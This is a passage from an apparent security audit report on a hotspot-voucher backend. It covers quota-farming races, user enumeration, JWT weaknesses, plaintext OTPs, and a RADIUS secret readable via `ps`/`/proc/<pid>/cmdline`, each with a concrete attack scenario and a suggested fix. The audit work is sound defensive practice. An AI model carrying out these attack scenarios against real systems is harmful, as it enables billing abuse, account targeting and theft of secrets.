**Concrete scenario.** An authenticated normal user scripts POST /api/v1/subscription/receipt, each time attaching a valid ~5MB JPEG and a random well-formed UUID as paymentId. multer writes the file to /app/uploads/receipts, verifyUploadMagicBytes passes (real image), then subscriptionService.uploadReceipt throws PAYMENT_NOT_FOUND (404) because no payment matches the UUID. The controller catch logs and forwards the error without deleting the file. Each request leaves a permanent 5MB orphan that is never garbage-collected and is served unauthenticated at /uploads/receipts/<userId>-<timestamp>.<ext>. Repeated at scale (rate limiting fails open on Redis error), this slowly exhausts the uploads volume on the prod VPS, breaking future legitimate receipt uploads and hosting arbitrary attacker image content on the domain.

**Suggested fix.** Guarantee cleanup of req.file when the request does not complete successfully: validate the body / resolve and authorize the payment BEFORE accepting the file (or upload to a temp dir and move only after uploadReceipt succeeds), and in the controller catch (plus an error-path middleware) fs.promises.unlink(req.file.path) on any failure after upload. Add a periodic sweeper for orphaned receipts with no referencing payment row, and a stricter per-user rate limit on the receipt endpoint.

---

### SQL-1 — Migration runner inherits app pool's 30s statement_timeout — non-concurrent CREATE INDEX on prod radacct can fail mid-deploy and crash-loop the backend

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** sql
- **Location:** `backend/src/migrations/runner.ts:62`

**What it is.** runner.ts executes migration SQL through the shared application pool (import { pool } from '../config/database', client.query(sql) at line 62). That pool is configured with statement_timeout: 30000 and query_timeout: 30000 (database.ts:15-16), applied per connection. Migration 036_keyset_pagination_indexes.sql builds idx_radacct_nasip_keyset ON radacct (nasipaddress, acctstarttime DESC, radacctid DESC) (lines 25-26) as a plain, non-CONCURRENT CREATE INDEX. radacct on prod is the FreeRADIUS accounting table already documented at >500k rows and growing per-session; migrations auto-run on backend boot during docker compose up.

**Impact.** Two failure modes on the prod deploy that ships 036: (1) if the index build exceeds 30s, Postgres cancels the statement (57014), the migration rolls back, runMigrations throws, boot aborts, and the container restarts and retries the same migration — a crash loop taking the API (and voucher issuance) down until manual intervention; (2) even when it finishes under 30s, the non-CONCURRENT build takes a lock that blocks FreeRADIUS accounting INSERT/UPDATEs on radacct for the build duration, stalling Accounting-Start/Stop processing for live hotspot users. The same pattern applies to any future large-table migration.

**Concrete scenario.** On a prod deploy shipping migration 036, the backend boots and runMigrations executes CREATE INDEX idx_radacct_nasip_keyset on a radacct table grown to millions of rows. The build exceeds the inherited 30s statement_timeout; Postgres cancels the statement (57014), the runner ROLLBACKs (runner.ts:70) and re-throws (line 74), boot aborts before listen, the container exits and docker restarts it, which retries the same migration — a crash loop that takes the API and voucher issuance down until an operator manually raises the timeout or builds the index by hand. Secondarily, even a sub-30s non-CONCURRENT build holds a lock on radacct that stalls FreeRADIUS Accounting-Start/Stop writes for live hotspot users during the build.

**Suggested fix.** In runMigrations, issue SET statement_timeout = 0 (and use a dedicated Client with no timeouts) on the migration connection; take pg_advisory_lock so two booting instances cannot race the runner. For future large radacct indexes, use CREATE INDEX CONCURRENTLY via a runner mode that executes such files outside a transaction, or build the index manually during a maintenance window before deploying.

---

### SQL-2 — Voucher delete decrements vouchers_used by pre-selected count, not actual deleted rowCount — concurrent deletes let an operator farm quota

- **Severity:** Medium  ·  **Verifier votes:** 3/3  ·  **Category:** sql
- **Location:** `backend/src/services/voucher.service.ts:1164`

**What it is.** bulkDeleteVouchers SELECTs matching voucher ids outside the transaction (lines 1116-1136), then inside the transaction DELETEs by id and decrements the subscription counter by the pre-selected length: `UPDATE subscriptions SET vouchers_used = GREATEST(vouchers_used - $1, 0) ... [voucherRows.length, userId]` (lines 1164-1167). The actual DELETE's rowCount is never used. deleteVoucher has the same shape: existence SELECT (1030-1034), then DELETE + unconditional decrement of 1 (1059-1063). If the same voucher rows are deleted by a concurrent request between the SELECT and the DELETE, both requests still decrement the full pre-selected count.

**Impact.** User-reachable billing-limit bypass on finite tiers: an operator creates N vouchers (vouchers_used += N via the atomic quota guard), then fires two concurrent bulk-delete requests with the same filter. Both SELECT the same N rows; one deletes them, the other deletes 0, but BOTH run vouchers_used -= N — net effect vouchers_used drops by 2N for N vouchers ever created. Repeated systematically this drives vouchers_used to 0 regardless of real consumption, giving effectively unlimited vouchers on a paid finite quota. The GREATEST(...,0) floor prevents negatives but not the under-count.

**Concrete scenario.** Operator on a 100-voucher finite tier keeps 50 real vouchers (vouchers_used=50), creates 50 throwaways (used=100), then fires two concurrent POST bulk-delete requests targeting the same 50 throwaway ids/filter. Both SELECT the same 50 rows before either transaction's DELETE runs. Transaction A deletes the 50 rows and sets used=max(100-50,0)=50; transaction B blocks on A's row locks, then its DELETE matches 0 rows but it still runs used=max(50-50,0)=0. Result: 50 live vouchers remain but vouchers_used=0, so checkQuota now permits creating 100 more — effectively unlimited vouchers on a paid finite quota by repeating the race.

**Suggested fix.** Capture the DELETE result and decrement by its actual rowCount: `const del = await client.query('DELETE FROM voucher_meta WHERE id = ANY($1) AND user_id=$2 AND router_id=$3', ...); ... vouchers_used - del.rowCount`. In deleteVoucher, decrement 1 only when the DELETE's rowCount is 1 (or fold the DELETE's RETURNING into the decrement).

---

## Low (26)

### ASYNC-2 — usageLimitEnforcement overlap race can insert duplicate 'Auth-Type := Reject' radcheck rows

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** async
- **Location:** `backend/src/jobs/usageLimitEnforcement.ts:89`

**What it is.** The over-limit guard is a NOT EXISTS subquery evaluated at SELECT time (lines 31-36), and enforceLimit then does DELETE + INSERT in a READ COMMITTED transaction (lines 89-97). When two ticks overlap (possible per ASYNC-1), both select the same username. If T2's DELETE starts before T1 commits, T2's snapshot cannot see T1's freshly inserted Reject row, so T2's DELETE misses it and T2's INSERT adds a second `Auth-Type := Reject` row for the same username. Unlike validityExpiration.ts:56-62, which correctly uses a conditional INSERT ... WHERE NOT EXISTS inside the same statement, enforceLimit has no in-statement guard or unique constraint.

**Impact.** radcheck accumulates duplicate Auth-Type rows for expired vouchers. Authentication is still rejected (both rows are ':= Reject'), so this is data hygiene rather than a security bypass — but it defeats the job's own dedup intent, and any later code that assumes at most one Auth-Type row per username (e.g. voucher re-enable logic that updates 'the' row instead of deleting all) will behave incorrectly.

**Concrete scenario.** Two overlapping cron ticks both SELECT username X (neither sees a committed Reject row). T1 begins enforceLimit, DELETE removes nothing, INSERT adds Reject row R1 uncommitted. Before T1 commits, T2 reaches enforceLimit for X; under READ COMMITTED its DELETE cannot see the uncommitted R1 so deletes nothing, then INSERTs R2. Both commit, leaving two identical Auth-Type := Reject rows for X in radcheck.

**Suggested fix.** Use the same conditional-insert pattern as validityExpiration.ts (INSERT ... SELECT ... WHERE NOT EXISTS (...)) or add a partial unique index on radcheck(username, attribute) for attribute='Auth-Type' with ON CONFLICT DO NOTHING; alternatively fold DELETE+INSERT into a single statement.

---

### ASYNC-3 — Graceful shutdown never stops cron jobs or the WireGuard monitor interval; startMonitoring handle is discarded

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** async
- **Location:** `backend/src/server.ts:123`

**What it is.** shutdown() (server.ts:46-79) closes the HTTP server, disconnects Redis (line 63), then ends the pg pool (line 67) — but none of the 9 cron jobs are stopped (their ScheduledTask handles are never kept; each startXJob() returns void) and the WG monitor interval handle is discarded at server.ts:123 (startMonitoring(); return value ignored, so the exported stopMonitoring() at wireguardMonitor.ts:390 is uncallable). During the shutdown window the 30s jobs and 60s monitor keep firing: after redis.disconnect() their Redis calls fail, and after pool.end() their queries throw 'Cannot use a pool after calling end'. All are caught and logged so there is no crash, but a monitor tick that checked out a client for its batch transaction (wireguardMonitor.ts:319) just before shutdown makes pool.end() wait for that client (up to the 30s statement_timeout), pushing shutdown toward the 30s kill timer and a forced exit(1) instead of a clean exit(0).

**Impact.** On every deploy (docker compose SIGTERM), shutdown can emit spurious job-failure error logs (noise in Sentry/log-based alerting) and intermittently exit 1 via the kill timer instead of 0 when a monitor/job DB operation is in flight, making deploys look unclean. In-flight radclient CoA children are killed mid-send by process.exit.

**Concrete scenario.** Operator runs a deploy (docker compose sends SIGTERM). At that instant a WireGuard monitor tick has just entered its batch transaction and holds a pool client (wireguardMonitor.ts:319-337). shutdown() closes the HTTP server, disconnects Redis, then calls pool.end() (server.ts:67), which blocks waiting for the busy client to be released while other jobs' post-Redis-disconnect ticks emit caught error logs. If the client isn't released quickly the 30s killTimer fires and the process exits 1 (server.ts:52) instead of the clean exit 0, making the deploy look failed and killing any in-flight radclient CoA child mid-send. No data is corrupted and the container restarts, but log-based alerting sees noise and a nonzero exit.

**Suggested fix.** Have each startXJob() return its ScheduledTask; keep the monitor's interval handle. In shutdown(), before disconnecting Redis: stop all cron tasks (task.stop()/destroy()) and clearInterval on the monitor, optionally await a short drain of in-flight ticks, then close Redis and the pool.

---

### ASYNC-4 — Per-user push path does not chunk at FCM's 500-token multicast limit, and device-token registration is uncapped per user

- **Severity:** Low  ·  **Verifier votes:** 2/3  ·  **Category:** async
- **Location:** `backend/src/services/notification.service.ts:196`

**What it is.** sendMulticast() correctly chunks at FCM_MULTICAST_CHUNK = 500 (notification.service.ts:78-79), but the per-user dispatcher sendPushToUser() builds a single MulticastMessage with all of the user's tokens (lines 196-204) and calls sendEachForMulticast once. firebase-admin rejects token lists over 500 entries, and that throw is swallowed by the outer catch (lines 219-221), silently killing every push for that user. Reachable because POST /notifications/device-token (any authenticated user) upserts unlimited unique token strings — deviceToken.service.ts:10-16 has no per-user cap, no max-row eviction, and no expiry, so tokens accumulate from reinstalls/emulators indefinitely.

**Impact.** A user whose device_tokens rows grow past 500 (organically over years of reinstalls, or deliberately — ~100 unique tokens/min under the general limiter crosses 500 in minutes) permanently stops receiving all push notifications, including router-offline alerts — the exact alerts paying operators rely on — with only a logged error as evidence. The table also grows without bound, and every notification for token-heavy users fans out to hundreds of dead FCM sends.

**Concrete scenario.** A single authenticated user's device_tokens rows exceed 500 (deliberately by POSTing 500+ unique token strings to /notifications/device-token, or in the far-fetched organic case of 500+ real reinstalls). On the next router_offline (or any) notification, sendPushToUser passes a >500-entry tokens array to sendEachForMulticast, firebase-admin throws messaging/invalid-argument, the outer catch at notification.service.ts:219 swallows it, and that user silently receives zero push notifications (including router-offline alerts) with only a logged error. Impact is confined to that one self-affected account; no other user, secret, or process is harmed.

**Suggested fix.** Route sendPushToUser's send through the existing sendMulticast() helper (it already chunks and prunes stale tokens). In registerToken, cap tokens per user (e.g. keep newest N=10-20: delete rows beyond the cap ordered by updated_at) and/or purge tokens not updated in 90+ days via an existing purge job.

---

### AUTH-1 — Login user-enumeration via timing side-channel and distinct pre-password status codes

- **Severity:** Low (finder proposed Medium; verifiers recalibrated)  ·  **Verifier votes:** 3/3  ·  **Category:** auth
- **Location:** `backend/src/services/auth.service.ts:84`

**What it is.** login() short-circuits for a non-existent email at lines 84-86 without ever calling bcrypt.compare, while a valid email with a wrong password runs bcrypt at cost 12 (line 105). This produces a large, reliable response-time delta (sub-millisecond vs ~200-300ms) that lets an unauthenticated attacker distinguish registered from unregistered emails. Additionally the is_active (line 90, 403 ACCOUNT_SUSPENDED) and locked_until (line 94, 423 ACCOUNT_LOCKED) checks run BEFORE the password check, so those distinct status codes positively confirm an account exists and reveal its state, without knowing the password.

**Impact.** An attacker scripting the login endpoint can build a list of valid customer emails (and identify suspended/locked accounts) purely from timing and HTTP status codes, then target them with credential-stuffing, phishing, or password-reset abuse. forgot-password/resend-verification were correctly hardened with generic responses, but login re-opens the same enumeration channel.

**Concrete scenario.** An unauthenticated attacker scripts POST /auth/login. For target email X with an arbitrary password: a fast response (no ~200ms bcrypt delay) plus 401 means X is not registered; a slow response with 401 means X exists (valid account, wrong password). A 403 ACCOUNT_SUSPENDED or 423 ACCOUNT_LOCKED immediately confirms X exists and reveals its state without knowing the password. Iterating a candidate email list (throttled to 10/min per limiter key, and unlimited if Redis is down since the limiter fails open) yields a validated set of customer emails plus flagged suspended/locked accounts for targeted phishing or credential-stuffing.

**Suggested fix.** Always run a bcrypt.compare against a fixed dummy hash when the user is absent (constant-time equalization), and defer the is_active / locked_until disclosure — or return a single generic 401 for absent/suspended/locked/wrong-password cases and only branch after the password is verified.

---

### AUTH-2 — Email-verification gate is bypassable: register issues full token pair and refresh() never re-checks is_verified

- **Severity:** Low (finder proposed Medium; verifiers recalibrated)  ·  **Verifier votes:** 3/3  ·  **Category:** auth
- **Location:** `backend/src/services/auth.service.ts:70`

**What it is.** login() blocks unverified accounts with EMAIL_NOT_VERIFIED (line 127), signalling that email verification is intended to gate active sessions. However register() immediately calls issueTokenPair for the brand-new, unverified user (line 70), and the authenticate middleware never checks is_verified. refresh() (lines 160-170) only requires is_active = TRUE, not is_verified. As a result a freshly registered user with a fake/unowned email obtains a working access token plus a 7-day rotating refresh token and can keep the session alive indefinitely without ever verifying, never needing to hit the login path that would block them.

**Impact.** The email-verification requirement is not an actual security boundary: anyone can register with an email they do not control (or a disposable one) and get full authenticated API access, defeating the anti-abuse / ownership-proof purpose of verification and any downstream logic that assumes an authenticated user has a verified, reachable email.

**Concrete scenario.** An attacker POSTs /api/v1/auth/register with a fake or disposable email they do not control. register() returns a valid 15-minute access token plus a 7-day rotating refresh token without any email verification. Because authenticate never checks is_verified and refresh() only requires is_active, the attacker uses the API (create routers, issue vouchers, etc.) as a fully authenticated user and refreshes the session for up to ~72 hours — despite login() being coded to block unverified accounts. After 72h the hourly purgeUnverified job deletes the row, collapsing the session, so the window is bounded rather than indefinite.

**Suggested fix.** Decide the policy and enforce it consistently: either do not issue a usable session at register (issue only a short verification token), or add an is_verified check in authenticate/refresh (or a requireVerified middleware on protected routes) so unverified accounts cannot obtain or renew a full session.

---

### AUTH-4 — JWT verification does not pin algorithms and access/refresh secrets are not required to differ

- **Severity:** Low  ·  **Verifier votes:** 2/3  ·  **Category:** auth
- **Location:** `backend/src/services/token.service.ts:46`

**What it is.** verifyAccessToken/verifyRefreshToken (lines 46, 50) call jwt.verify(token, secret) with no options object, so the accepted algorithm set is not pinned to ['HS256']. jsonwebtoken v9 does reject 'none' when a key is supplied, so this is not directly exploitable today, but it is defense-in-depth that should be explicit. More concretely, config (index.ts lines 102-103) validates each secret is >=32 chars but never enforces JWT_ACCESS_SECRET != JWT_REFRESH_SECRET. If an operator sets them equal, a refresh token (payload {userId, jti}) would verify successfully as a Bearer access token in authenticate(), yielding req.user = {id, email: undefined, name: undefined, role: undefined} — a token-type confusion where a long-lived refresh token is accepted on access-protected routes.

**Impact.** With no algorithm pin, any future dependency/key-handling change reopens algorithm-confusion risk. With equal secrets (a plausible misconfiguration given both are just 'a 32+ char string'), refresh tokens become usable as access tokens, extending an access credential's effective validity from 15 minutes to 7 days.

**Concrete scenario.** Only under operator misconfiguration: if an operator sets JWT_ACCESS_SECRET === JWT_REFRESH_SECRET (unenforced), a user's own 7-day refresh token would pass verifyAccessToken() and be accepted as a Bearer access token on access-protected routes, extending that credential's effective life from 15m to 7d and surviving refresh-token revocation (access path does not consult Redis). No privilege escalation occurs (role resolves to undefined, failing admin/tier gates), and no attacker-controlled input reaches the precondition. The algorithm-pin facet has no reachable exploit given the symmetric secret.

**Suggested fix.** Pass { algorithms: ['HS256'] } to both jwt.verify calls, and add a Zod .refine (or startup assertion) that JWT_ACCESS_SECRET !== JWT_REFRESH_SECRET.

---

### AUTH-5 — Access tokens are not revocable — remain valid up to 15 minutes after logout / password reset / password change

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** auth
- **Location:** `backend/src/middleware/authenticate.ts:16`

**What it is.** authenticate() validates the access token purely by signature/expiry (verifyAccessToken) with no server-side revocation check. logout, resetPassword, and changePassword revoke refresh tokens but there is no mechanism (jti allowlist/denylist, token version, or per-user epoch) to invalidate already-issued access tokens. An access token stolen or held by a compromised/terminated session stays usable until its 15-minute expiry regardless of logout or password change.

**Impact.** After a user resets their password (e.g., in response to a suspected compromise) or logs out, any access token already in an attacker's hands continues to authorize API calls for up to 15 minutes. Limited blast radius due to the short TTL, but it means 'All sessions have been invalidated' (the message returned by resetPassword/changePassword) is not strictly true for access tokens.

**Concrete scenario.** A user's access token is captured (e.g., leaked via a compromised device or intercepted). The user notices and resets their password; the server responds 'All sessions have been invalidated' and revokes all refresh tokens. The attacker, however, keeps using the already-captured 15-minute access token as a Bearer credential: authenticate() accepts it on every request because there is no revocation lookup, so the attacker continues to call authenticated APIs (read routers/vouchers, list sessions, etc.) until the token's original 15-minute expiry elapses — despite the password reset that was meant to lock them out immediately.

**Suggested fix.** Accept the trade-off as documented, or add a lightweight per-user token epoch (e.g., password_changed_at / token_version claim) checked in authenticate so access tokens issued before a credential change are rejected.

---

### AUTH-6 — logout endpoint has no rate limiter

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** auth
- **Location:** `backend/src/routes/auth.routes.ts:72`

**What it is.** Every other auth route mounts authLimiter (10/min), but POST /logout (lines 72-76) is registered with only the body validator and no limiter. logout performs a jwt.verify plus a Redis DEL per call. It is unauthenticated (any body/cookie token accepted) and uncapped.

**Impact.** An attacker can hammer /logout without the per-route auth throttle, spending signature-verification CPU and Redis round-trips. Low impact given the operation is cheap and idempotent, but it is an inconsistent gap in the auth-route throttling and the general limiter (100/min) is the only backstop.

**Concrete scenario.** An unauthenticated attacker sends a flood of POST /api/v1/auth/logout requests (each with an arbitrary or garbage refresh token in the body). Because no authLimiter (10/min) is mounted on this route, each request is only bounded by the global limiter, and every request forces an HS256 jwt.verify plus, for structurally valid tokens, a Redis DEL — spending CPU and Redis round-trips beyond what the tightened auth throttle would permit. Impact is minor because the work per request is cheap and idempotent, but it is a genuine inconsistency in auth-route throttling.

**Suggested fix.** Add authLimiter (or a dedicated limiter) to the /logout route for parity with the other auth endpoints.

---

### AUTH-7 — Refresh cookie 'secure' flag is disabled outside NODE_ENV=production (e.g. staging)

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** auth
- **Location:** `backend/src/controllers/auth.controller.ts:43`

**What it is.** refreshCookieOptions() sets secure: config.NODE_ENV === 'production'. The wasel_rt HttpOnly refresh cookie therefore lacks the Secure attribute on any non-production environment, including the staging VPS (wa-sel.cloud) if it does not run with NODE_ENV=production. Combined with SameSite=strict this is largely mitigated, but a cookie without Secure can be transmitted over a plaintext HTTP request to the same host.

**Impact.** If staging (or any admin-accessible non-prod deployment) is ever reachable over HTTP or downgraded, the admin refresh cookie could be sent in cleartext and captured. Low because prod is correct and SameSite=strict limits exposure, but the admin session cookie is a high-value credential.

**Concrete scenario.** On the staging VPS (wa-sel.cloud) running with NODE_ENV != 'production', an admin authenticates via the SPA and receives the wasel_rt refresh cookie without the Secure flag. If any admin-originated request to that host traverses plaintext HTTP (e.g. an http:// link/redirect, a misconfigured/absent HTTPS redirect, or a downgrade by an on-path attacker on the same network), the browser attaches wasel_rt in cleartext and it can be captured, yielding a 7-day admin refresh credential. Not reachable in production, where secure=true.

**Suggested fix.** Set Secure whenever the deployment is served over TLS (e.g., a dedicated COOKIE_SECURE/behind-TLS config flag) rather than keying strictly on NODE_ENV === 'production', so staging over HTTPS also gets the Secure attribute.

---

### CODE-5 — Non-functional subscription grace period: expired-status branch in requireSubscription is unreachable

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** code
- **Location:** `backend/src/middleware/requireSubscription.ts:20`

**What it is.** requireSubscription obtains the subscription via getActiveSubscription(), whose query filters status = 'active' AND end_date > NOW() (subscription.service.ts:418-424) and therefore never returns a row whose status is 'expired'. The subsequent branch `if (subscription.status === 'expired')` that is meant to grant a 7-day read-only GET grace period (lines 20-25) is dead code: an expired user's getActiveSubscription() returns null and the middleware throws SUBSCRIPTION_REQUIRED at line 17 before the grace logic runs.

**Impact.** The intended 7-day read-only grace window after expiry does not exist — expired operators are hard-blocked from all subscription-gated routes including GETs. This fails closed (more restrictive, not an auth bypass), but it is a real behavioral defect in subscription enforcement and the grace-period code gives a false sense that read access continues after expiry.

**Concrete scenario.** An operator's subscription expires (end_date passes or a cron flips status to 'expired'). They issue a GET to a subscription-gated route expecting the advertised 7-day read-only grace window. getActiveSubscription() returns null (row no longer matches status='active' AND end_date>NOW()), so line 16 throws 403 SUBSCRIPTION_REQUIRED before the grace branch at line 20 can execute. The grace period never applies — expired operators are hard-blocked from all gated GETs, contradicting the code's stated intent. No exploit; the defect is that documented lenient behavior silently does not exist.

**Suggested fix.** If the grace period is desired, have requireSubscription look up the most recent subscription regardless of status (or add a dedicated getSubscriptionForGate() that also returns recently-expired rows within the grace window) and apply the GET-only rule there; otherwise remove the dead grace-period branch to avoid implying behavior that never executes.

---

### CODE-6 — package.json reprovision scripts point to deleted src/scripts/reprovisionBroken.ts

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** code
- **Location:** `backend/package.json:15`

**What it is.** package.json defines "reprovision:broken": "ts-node src/scripts/reprovisionBroken.ts" and "reprovision:broken:prod": "node dist/scripts/reprovisionBroken.js" (lines 15-16), but src/scripts/ contains only backfillWgEndpoint.ts and migrate.ts. The script was deliberately deleted in commit c170786 ('reprovisionBroken.ts ... deleted for cleanliness') when the API-push provisioning path was removed, but the npm script entries were left behind.

**Impact.** An operator running `npm run reprovision:broken` during an incident (the exact situation the script name promises to solve) gets a ts-node 'Cannot find module' error instead of a useful tool — wasted time during recovery on a prod system with paying users. The :prod variant fails the same way since tsc never emits dist/scripts/reprovisionBroken.js.

**Concrete scenario.** During an incident an operator runs `npm run reprovision:broken` (name implies it fixes broken router provisioning) and gets a ts-node "Cannot find module 'src/scripts/reprovisionBroken.ts'" error instead of a working tool; the :prod variant fails identically because dist/scripts/reprovisionBroken.js is never emitted. Cost is wasted minutes/confusion during recovery — no production process impact, no security or data consequence.

**Suggested fix.** Delete both reprovision:broken script entries from package.json (the paste-script provisioning model has no auto-reprovision path anymore).

---

### CRYPTO-1 — Per-router RADIUS shared secret passed as a radclient command-line argument (visible in /proc/<pid>/cmdline)

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** crypto
- **Location:** `backend/src/services/radclient.service.ts:148`

**What it is.** sendDisconnectRequest builds args = ['-x','-t',...,'-r','1',`${nasIp}:${port}`,'disconnect', secret] and spawns radclient with the decrypted per-router RADIUS shared secret as the final positional argv element (line 148). The same pattern exists in sendAccessRequest (line 47). Because the secret is an argv token, it is exposed in /proc/<pid>/cmdline and `ps` output to any co-located process for the lifetime of the radclient child — undermining the AES-256-GCM at-rest protection (radius_secret_enc). The decrypted secret originates from decrypt(router.radius_secret_enc) (session.service.ts:142, voucher.service.ts:1221) and nas.secret (validityCoaDisconnect.ts:56-60). PROJECT_SUMMARY/PROJECT_STATE claim the F1 fix means 'the encrypted RADIUS secret no longer appears in /proc/<pid>/cmdline' — that claim is inaccurate for the disconnect path; the F1 change removed the shell (RCE) but the secret is still on the command line.

**Impact.** Any process able to read the process table on the host/container (backend + freeradius run in network_mode: host) can read a router's plaintext RADIUS shared secret while a CoA/Disconnect is in flight. With that secret an attacker who can also reach UDP/1812 or 3799 could forge RADIUS Access-Accept validation or CoA Disconnect packets for that NAS. Practical blast radius is limited (local access required, millisecond window), but it is an avoidable secret exposure and a live contradiction of the documented remediation.

**Concrete scenario.** A low-privilege or compromised process co-located in the backend container's PID namespace (or on the host) runs `cat /proc/<pid>/cmdline` / `ps auxww` while a CoA Disconnect or health-check Access-Request is in flight and reads the router's plaintext RADIUS shared secret from radclient's argv. With that secret and reachability to the router's UDP/1812 or 3799 (available over the shared host network), the attacker could forge RADIUS Access-Accept validation traffic or CoA Disconnect-Request packets for that NAS. Blast radius is limited by the need for pre-existing local/container access and the sub-second child lifetime.

**Suggested fix.** Pass the shared secret to radclient via its -S <file> option (read from a mode 0600 temp file, as already done for the WireGuard PSK), unlinking it in a finally block, or via env/stdin — not as an argv token. The username/password are already correctly written to stdin; extend that discipline to the secret. Update the PROJECT_SUMMARY/PROJECT_STATE F1 note to reflect actual behavior.

---

### CRYPTO-3 — Modulo bias in generateRadiusSecret, payment reference-code, and voucher-code generation

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** crypto
- **Location:** `backend/src/utils/encryption.ts:96`

**What it is.** generateRadiusSecret maps random bytes with chars[bytes[i] % chars.length] where chars.length is 62. Since 256 % 62 = 8, the first 8 characters of the alphabet are selected with probability 5/256 instead of 4/256 — a classic modulo bias. The bytes come from crypto.randomBytes (CSPRNG, good), but the reduction is non-uniform. subscription.service.ts:120 (generateReferenceCode) and voucher.service.ts:79 (generateRandomString, 55-char charset, 256 % 55 = 36) share the same pattern.

**Impact.** The per-router RADIUS shared secret has slightly less than the intended 62^32 entropy (~190 bits effective — practically irrelevant), more relevant conceptually for the 8-digit voucher codes where guessing is rate-limited only by the RADIUS surface. No practical exploit today; this is crypto-hygiene correctness on a live payment platform.

**Concrete scenario.** An attacker enumerating RADIUS shared secrets or voucher codes would find the character/digit distribution very slightly non-uniform (e.g. leading chars of the RADIUS secret 25% more likely to fall in A-H; voucher digits 0-5 ~4% more likely than 6-9). This shaves only a negligible amount off the effective search space and does not enable a practical guess given the key sizes and rate limiting — there is no concrete exploit, only reduced crypto margin.

**Suggested fix.** Use crypto.randomInt(chars.length) per character (CSPRNG, bias-free, already used for OTPs in token.service.ts), or rejection-sample bytes >= 248 before the modulo, at all three sites.

---

### GAP-2 — Audit-log `ipAddress` records Nginx's IP for every admin/settings action, destroying forensic value

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** audit-logging
- **Location:** `backend/src/controllers/admin.controller.ts:46`

**What it is.** The same missing `trust proxy` setting means the `clientIp(req)` helper (admin.controller.ts:46 `return Array.isArray(req.ip) ? req.ip[0] : req.ip || ''`, mirrored in settings.controller.ts:8) reads `req.ip`, which behind Nginx is Nginx's constant upstream address, not the real client. Every audit_log row written across admin.controller.ts (createRouter/reviewPayment/plan edits/admin CRUD, ~25 call sites) and settings.controller.ts:52 stores that same non-distinguishing IP.

**Impact.** Audit records cannot attribute admin actions to a real source IP — every entry shows the same proxy address. Forensic/incident-response value of the ipAddress column is lost, and IP-based anomaly detection on the audit trail is impossible. Blast radius is limited to logging quality (no auth/data impact), hence Low.

**Concrete scenario.** Two distinct admins (or an attacker using stolen admin creds from a different network) each perform sensitive actions — reviewPayment approval, plan edits, settings.update_bank changing the bank account number. During incident response, audit_logs.ip_address shows the identical Nginx proxy IP for every row, so investigators cannot attribute actions to a real source or run IP-based anomaly detection on the trail.

**Suggested fix.** Fixing the same root cause (adding `app.set('trust proxy', 1)` in app.ts) makes `req.ip` reflect the real client via X-Forwarded-For, correcting both the rate-limit keys and every audit-log ipAddress simultaneously.

---

### GAP-3 — verifyEmail leaks account existence (404 USER_NOT_FOUND vs 400 OTP_INVALID) — email enumeration

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** information-disclosure
- **Location:** `backend/src/services/auth.service.ts:176`

**What it is.** verifyEmail() queries the users table for the submitted email BEFORE validating the OTP and throws 404 'USER_NOT_FOUND' when no row exists (line 176), but returns 400 'OTP_INVALID' when the email exists and the code is wrong. An unauthenticated caller hitting POST /auth/verify-email can therefore distinguish registered from unregistered emails by the status/error code. This directly contradicts the enumeration-hardening the same file applies elsewhere: resendVerification (line 205) and forgotPassword (line 226) both comment '// Always return success to prevent email enumeration' and return silently for unknown emails. Note resetPassword does NOT have this issue because its 404 (line 250) is only reachable after the OTP already validated, which is impossible for a non-existent user.

**Impact.** An unauthenticated attacker can enumerate which email addresses have accounts on the platform (PII / account-existence disclosure), aiding targeted credential-stuffing and phishing. Blast radius limited to confirming account existence; no auth bypass.

**Concrete scenario.** An unauthenticated attacker sends POST /api/v1/auth/verify-email with {email: "target@example.com", otp: "000000"}. If the response is 404 USER_NOT_FOUND, no account exists for that email; if it is 400 OTP_INVALID, an account exists (with a wrong code). Iterating a list of emails confirms which have accounts, aiding targeted phishing/credential-stuffing. Impact is limited to account-existence confirmation — no auth/authz bypass — and the same information is already obtainable via register()'s 409 EMAIL_EXISTS response.

**Suggested fix.** Make verifyEmail's unknown-email path indistinguishable from the wrong-OTP path: when the user is not found (or already verified), return the same generic 400 OTP_INVALID response and status as an invalid code, instead of a distinct 404 USER_NOT_FOUND. This matches the enumeration-safe pattern already used in forgotPassword/resendVerification.

---

### GAP-4 — OTP compared with plain string inequality and stored plaintext in Redis (non-constant-time, no hashing at rest)

- **Severity:** Low  ·  **Verifier votes:** 3/3  ·  **Category:** hardening
- **Location:** `backend/src/services/token.service.ts:154`

**What it is.** All three OTP-verify paths compare the submitted 6-digit code against the stored value with a plain JS string comparison — validateVerificationOtp `stored !== otp` (line 154), validatePasswordResetOtp `stored !== otp` (line 178), validateEmailChangeOtp `code !== otp` (line 218) — which is non-constant-time (V8 short-circuits on first differing char). The codes are also stored plaintext in Redis: createVerificationOtp `redis.set(key, otp, ...)` (line 145), createPasswordResetOtp (line 169), and createEmailChangeOtp stores `JSON.stringify({ code, newEmail })` (line 199). Anyone with Redis read access (or a Redis dump/backup) can read live OTPs directly and immediately complete password-reset / email-verify / email-change for any pending user. The timing side-channel itself is largely mitigated in practice by the 5-attempt hard cap that DELETES the OTP key on the 5th miss (recordWrongOtpAttempt, lines 130-134), so a code cannot be probed more than 5 times before destruction — hence defense-in-depth rather than a practical timing break.

**Impact.** Defense-in-depth gap. Primary risk is plaintext-at-rest: a Redis compromise or leaked snapshot exposes active reset/verify/email-change codes, enabling account takeover of any user with a pending OTP. Timing leakage is low-risk given the 5-try destroy-on-lockout cap.

